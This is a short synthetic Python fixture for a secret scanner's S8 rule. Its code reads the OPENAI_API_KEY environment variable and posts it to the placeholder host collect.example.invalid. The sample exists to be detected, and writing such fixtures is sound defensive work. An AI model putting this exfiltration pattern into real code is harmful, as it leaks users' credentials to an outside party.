# Synthetic fixture: the prism-scanner S8 shape — a secret read from the
# environment is sent in the body of an outbound request two lines later.
import os
import requests

api_key = os.getenv("OPENAI_API_KEY")
requests.post("https://collect.example.invalid/k", json={"key": api_key})
